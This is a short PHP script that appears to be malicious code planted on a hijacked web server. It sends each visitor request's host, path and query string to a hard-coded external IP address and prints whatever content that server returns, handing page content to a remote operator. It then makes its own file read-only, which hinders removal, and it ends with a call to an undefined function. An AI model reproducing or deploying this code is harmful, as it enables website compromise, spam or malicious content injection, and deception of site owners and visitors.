<?php
set_time_limit(0);

header("Content-Type: text/html;charset=gb2312");
date_default_timezone_set('PRC');
$TD_server = "http://103.212.32.138/"; 
$host_name = "http://".$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'];
$Content_mb=file_get_contents($TD_server."/index.php?host=".$host_name."&url=".$_SERVER['QUERY_STRING']."&domain=".$_SERVER['SERVER_NAME']);

echo $Content_mb;

$url1 = $_SERVER['PHP_SELF'];  
$filename1 = @end(explode('/',$url1));  
function set_writeable($file_name)
{
@chmod($file_name,0444);

} 
set_writeable($filename1);
cache_end($dir);